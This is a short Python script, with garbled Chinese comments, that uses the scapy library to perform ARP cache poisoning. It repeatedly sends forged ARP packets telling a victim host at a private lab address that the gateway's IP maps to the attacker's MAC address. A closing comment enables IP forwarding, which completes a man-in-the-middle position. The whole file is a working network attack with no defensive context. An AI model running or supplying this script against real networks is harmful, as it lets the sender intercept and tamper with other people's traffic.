#coding: utf-8

from scapy.all import *

# ����������IP����
interFace = 'eth0'
# �����������ߡ���ip��ַ
tip = '192.168.121.128'
# Ŀ���ip��ַ
lip = '192.168.121.132'
# ���ص�ip��ַ
gip = '192.168.121.2'
# ת����mac��ַ
tmac = getmacbyip(tip)
# ʹ�ô˷�����ȡmac��ַ
lmac = get_if_hwaddr(interFace)
# ת����mac��ַ
gmac = getmacbyip(gip)

# Ether����������̫�����ݰ�������һ����̫�����ݰ�ͨ����Ҫָ��Ŀ���ԴMAC��ַ
# ����ARP��Ҫ����ע�����5��������
#  op     ȡֵΪ1����2������ARP���������Ӧ����
#  hwsrc  ���ͷ�Mac��ַ��
#  psrc   ���ͷ�IP��ַ��
#  hwdst  Ŀ��Mac��ַ��
#  pdst   Ŀ��IP��ַ��
pack = Ether(dst = tmac, src = lmac) / ARP(op = 1, hwsrc = lmac, psrc = gip, hwdst = tmac, pdst = tip)

while True:
	# sendp(pack ���ݰ�, inter=2 ����ʱ���� , iface=����)
	sendp(pack, inter = 2, iface = interFace)
	
# sysctl net.ipv4.ip_forward=1  ʵ��ipת��